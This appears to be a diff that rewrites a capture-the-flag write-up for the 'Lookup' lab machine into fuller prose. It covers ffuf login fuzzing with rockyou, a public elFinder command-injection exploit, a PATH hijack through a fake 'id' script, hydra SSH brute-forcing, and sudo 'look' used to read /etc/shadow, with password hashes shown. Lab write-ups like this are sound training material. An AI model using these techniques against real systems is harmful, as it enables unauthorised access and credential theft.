@@ -56,7 +56,7 @@ PORT   STATE SERVICE REASON  VERSION
 |_http-server-header: Apache/2.4.41 (Ubuntu)
 ```
 
-The website seems to return a login page it is a very basic website I am going to attempt to fund users with `ffuf`.
+The site resolved to a fairly bare-bones login page, nothing beyond a username and password field, so before guessing at credentials outright I wanted to know which usernames were even valid to begin with. My plan was to fuzz the login form with `ffuf`, holding the password constant and watching for a response size that broke away from the rest of the noise.
 
 
 ```bash
@@ -72,7 +72,7 @@ jose
 
 ### Logging into website
 
-I was able to find credentials for the user `jose` it is a `302 Redirect` to the subdomain `files.lookup.thm`
+With two valid usernames in hand, `admin` and `jose`, credential spraying was the obvious next move. Rather than burn attempts against the account most likely to be monitored, I focused on `jose` and threw the classic `rockyou` wordlist at the login form, again watching for a response size anomaly to flag the correct password:
 
 ```bash
  ffuf -w /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -d "username=jose&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -u http://lookup.thm/login.php -c   --fs 62 
@@ -80,7 +80,7 @@ I was able to find credentials for the user `jose` it is a `302 Redirect` to the
 
 ![Pasted image 20250519193054](Pasted-image-20250519193054.png)
 
-The website seem to be a file hosting website running `ElFinder` which I tried to search for known exploits.
+That turned up a working password for `jose`, and logging in redirected me straight to a subdomain I hadn't encountered yet, `files.lookup.thm`. That subdomain turned out to be a file hosting application built on `ElFinder`, and running software with a recognizable name and no custom branding on top of it is usually the fastest route to a public exploit, so I went straight to checking its version against known vulnerabilities.
 
 ![Pasted image 20250519193310](Pasted-image-20250519193310.png)
 
@@ -97,15 +97,15 @@ Copied to: /home/anarchy/thm/boxes/Lookup/46481.py
 
 ![Pasted image 20250519193642](Pasted-image-20250519193642.png)
 
-now we have a shell!
+The 2019 command injection in elFinder's PHP connector, CVE-2019-9194, matched the version running here, and firing the public exploit against it dropped me straight into a shell as `www-data`.
 
 #### Enumerating the system
 
-Looking through my logs from `linpeas` I found an interesting `SGID` binary called `pwm` which when executed gives the following output.
+With a foothold established, I ran `linpeas` to speed up enumeration rather than manually chasing every possible privesc vector by hand, and one result stood out immediately from the rest of the noise: an SGID binary named `pwm`. Running it produced output that told me exactly what it was doing under the hood.
 
 ![Pasted image 20250519202117](Pasted-image-20250519202117.png)
 
-in the user `think` directory they have a file called `.passwords` maybe we can get the contents of their file with this. It extracts the user from the command ID which we can create our own `id` binary to give the output of the user `think`
+`pwm` appeared to read a `.passwords` file sitting in the home directory of a user called `think`, and it decided which user's password list to display by shelling out to the `id` command rather than checking the real caller's UID directly. That's a classic `$PATH` hijack waiting to happen: if I could get my own `id` executed in place of the system one, I could convince `pwm` to hand me `think`'s password list regardless of who I actually was. So I wrote a fake `id` that simply echoed back a UID belonging to `think`:
 
 ```bash
 #!/bin/bash
@@ -113,11 +113,15 @@ in the user `think` directory they have a file called `.passwords` maybe we can 
 echo "uid=33(think) gid=33(think) groups=33(think)"
 ```
 
+With that script saved as `id` and made executable, the next step was making sure the shell would find my version before the real one on disk, so I checked the current `$PATH` and prepended a writable directory, `/tmp`, ahead of everything else:
+
 ```bash
 (remote) www-data@lookup:/tmp$ echo $PATH
 /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/system/bin:/system/sbin:/system/xbin
 (remote) www-data@lookup:/tmp$ export PATH="/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/system/bin:/system/sbin:/system/xbin"
 ```
+
+With `/tmp` now first in the search path, running `pwm` again meant it would call my fake `id` instead of `/usr/bin/id`, and it worked exactly as I'd hoped:
 
 ```bash
 (remote) www-data@lookup:/tmp$ pwm
@@ -174,7 +178,7 @@ jose.9298
 jose.2856171
 ```
 
-From there I used `hydra` to bruteforce the password.
+That gave me a sizeable candidate password list tailored specifically to `think`, so rather than trying each entry by hand, I saved the list and pointed `hydra` at SSH to brute-force the account.
 
 ```bash
 hydra -l think -P passwords.lst ssh://lookup.thm -I
@@ -183,6 +187,8 @@ hydra -l think -P passwords.lst ssh://lookup.thm -I
 ![Pasted image 20250519202800](Pasted-image-20250519202800.png)
 
 #### Privesc to root
+
+Once I had a shell as `think`, checking `sudo -l` is second nature before trying anything more involved, and it paid off immediately: `think` could run `/usr/bin/look` as any user. `look` is a well-known entry in GTFOBins precisely because of how it behaves when it can't find its default dictionary file at `/usr/share/dict/words`: rather than failing closed, it happily opens whatever file gets passed to it next and prints the contents. Setting `LFILE` to a target path and passing an empty search term as the first argument was enough to turn a whitelisted `sudo` binary into an arbitrary file read as root, letting me pull the entire `/etc/shadow` file, root's hash included:
 
 ```bash
 think@lookup:~$ sudo -l
@@ -236,6 +242,8 @@ think:$6$Cqt14LKfnwO1hA/a$c/g4M9yiP1KGJtbiOS4zubpw2.sm4bPfCglqddPpUS615xwwsU4eg1
 fwupd-refresh:*:19510:0:99999:7:::
 mysql:!:19568:0:99999:7:::
 ```
+
+With the technique confirmed against `/etc/shadow`, reading the actual flag was just a matter of pointing `LFILE` somewhere more useful:
 
 ```bash
 think@lookup:~$ LFILE=/root/root.txt
